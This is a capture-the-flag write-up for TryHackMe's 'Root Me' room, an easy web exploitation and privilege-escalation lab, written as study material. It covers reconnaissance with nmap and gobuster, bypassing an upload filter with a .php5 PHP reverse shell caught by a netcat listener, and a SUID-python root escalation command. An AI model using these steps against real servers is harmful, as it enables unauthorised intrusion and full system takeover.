# Root Me - TryHackMe Write-up

- **Platform:** [TryHackMe](https://tryhackme.com/)
- **Room:** Root Me
- **Difficulty:** Easy
- **Category:** Web Exploitation & Boot2Root
- **Tools Used:** Kali Linux
  
## Challenge Overview
In this challenge, we are breaking into an insecure Linux web server that has a couple of big security flaws. Our main mission is to find a hidden file upload page, sneak a reverse shell script onto the website by slightly changing its file extension, and use that connection to gain basic user access. Once inside, we take advantage of a misconfigured Python tool that runs with full administrator permissions to escalate our account to root and grab the final flag.

"A ctf for beginners, can you root me?"

<img width="970" height="311" alt="image" src="https://github.com/user-attachments/assets/c137433a-70a3-47c2-9fa9-ce6ca3a33ced" />

## 1: Deploy the target machine

Connect to TryHackMe network and deploy the machine. If you don't know how to do this, complete the OpenVPN room first.

## 2: Recon

We start by gathering information on the target machine to discover what services and hidden entry points are available by typing :

```bash
nmap -Pn -sC -sV -T4 [TARGET IP ADDRESS]
```

<img width="777" height="361" alt="image" src="https://github.com/user-attachments/assets/49ec9dae-2d81-4a9a-b861-818e37b8e53f" />


- -Pn (No Ping): Tells Nmap to skip the initial ping check and treat the target host as online. This is useful if a firewall blocks standard ping requests.

- -sC (Default Scripts): Runs Nmap’s collection of default, safe scripts to automatically gather common information (like web server titles, SSL certificates, and basic vulnerabilities).

- -sV (Service Version Detection): Probes open ports to find out what software and exact version number is running on them (for example, detecting Apache 2.4.41 on port 80).

- -T4 (Timing Template): Sets the scan speed to "Aggressive" (Level 4 out of 5) to make the scan run faster on reliable networks.


The nmap scan result above will answer the first three questions:

1. How many ports are open? *
2. What version of Apache is running? 2.*.**
3. What service is running on port 22? S**

## 3: Find directories on the web server using the GoBuster tool.

The main landing page is plain, so we use Gobuster to hunt for hidden directories.

```bash
gobuster dir -u http://<TARGET-IP> -w /usr/share/wordlists/dirb/common.txt
```

<img width="677" height="353" alt="image" src="https://github.com/user-attachments/assets/7adb1313-ec6c-433c-9f45-7fdbe61b78e9" />


- gobuster: The name of the tool.

- dir: Directory and file enumeration mode.

- -u http://<TARGET-IP>: The target URL or IP address you want to scan.

- -w <path/to/wordlist>: The file path to the wordlist of common folder and file names.

The gobuster scan result above will answer the next question:

4. What is the hidden directory? /p****/

## 4. Reverse Shell

Go to hidden directory that we found by using gobuster

<img width="777" height="410" alt="image" src="https://github.com/user-attachments/assets/efa6ed65-6aa7-4ebb-9898-4c596286a936" />

Look like we got an upload file page. So next logical move is to upload a script that connects back to your machine. (reverse shell)

Because the target runs an Apache web server that processes PHP, a PHP reverse shell is the best tool for the job. Download the PHP reverse shell [here](https://pentestmonkey.net/tools/web-shells/php-reverse-shell).

I extracted the archive and edited the script file, updating the $ip variable with my Kali tun0 VPN IP and setting $port to 4445 (or any availble port).

<img width="527" height="185" alt="image" src="https://github.com/user-attachments/assets/c1f8113a-277d-44ee-b1ac-71f194e6b799" />


I tried uploading the script as php-reverse-shell.php, but the web application blocked it because .php file extensions are not allowed.

<img width="603" height="468" alt="image" src="https://github.com/user-attachments/assets/0d7b24ad-7bcc-4ee0-8763-928de48b130c" />

To bypass the filter, I renamed the file extension to an alternative PHP extension. The server accepted the file and uploaded it successfully.

<img width="617" height="506" alt="image" src="https://github.com/user-attachments/assets/a0698c2a-c72a-4c87-a95f-8de7e5b5f3f0" />

Next, i open another terminal and I started a listener to wait for the incoming connection:

```bash
nc -lvnp 4445
```

In another terminal tab, I used curl to request the uploaded file's URL and execute the code:

```bash
curl http://<TARGET-IP>/uploads/php-reverse-shell.php5
```

The target server connected back to my Netcat listener. I accessed the shell as www-data

<img width="1055" height="187" alt="image" src="https://github.com/user-attachments/assets/09c1d328-a090-4ba0-8cfb-31f6d98655a1" />

And then find user.txt by using find command :

```bash
find / -type f -name user.txt 2>/dev/null
```

- find /: Starts searching from the root directory down through every folder on the entire system.

- -type f: Restricts the search to regular files only (ignores folders and directories).

- -name user.txt: Looks specifically for the file named user.txt.

- 2> /dev/null: Silences and throws away all "Permission Denied" error messages so only the actual file path appears on your screen.


<img width="356" height="72" alt="image" src="https://github.com/user-attachments/assets/46dc22fa-adc0-49f5-b688-24199aadbd3b" />


and then type

```bash
cat /var/www/user.txt
```

and you found the user flag 😁

5. What is user.txt? THM{y**_***_*_****l}

## Privileges Escalation

Final step is to find a security misconfiguration that lets us elevate our access to root

**What is SUID:**

- SUID (Set Owner User ID) is a special Linux file permission.

- When a file has the SUID bit enabled, anyone who runs it will run it with the permissions of the file owner (which is usually the root administrat

**Finding SUID Files:**

- We scan the entire system to find all files with SUID permissions enabled:

```bash
find / -type f -perm -4000 2>/dev/null
```

- find /: Searches the entire file system starting from the root directory.

- -type f: Looks only for files, ignoring folders and directories.

- -perm -4000: Filters specifically for files that have the SUID permission bit turned on (4000).

- 2>/dev/null: Hides all "Permission Denied" errors so they do not clutter your terminal screen.

**Identifying the Vulnerable Binary:**

- Most files in the scan results are normal system utilities (like passwd, ping, or mount).

- However, ```/usr/bin/python``` appears in the output. This is a severe misconfiguration because Python is a programming language that can execute custom system commands. Having the SUID bit on Python means we can use it to run commands as root.

6. Search for files with SUID permissions, which file is weird? /u**/***/******

Check gtfobins on how to exploit the suid. Access GTFObins [here](https://gtfobins.org/)

```bash
/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

**Confirming Root**

<img width="552" height="60" alt="image" src="https://github.com/user-attachments/assets/4befd5d4-ec00-4e2b-b526-3f089a98ca81" />

Search for root.txt. Type 
```bash
find / -type f -name root.txt
```

and then you use ```cat``` to found the final flag 😁
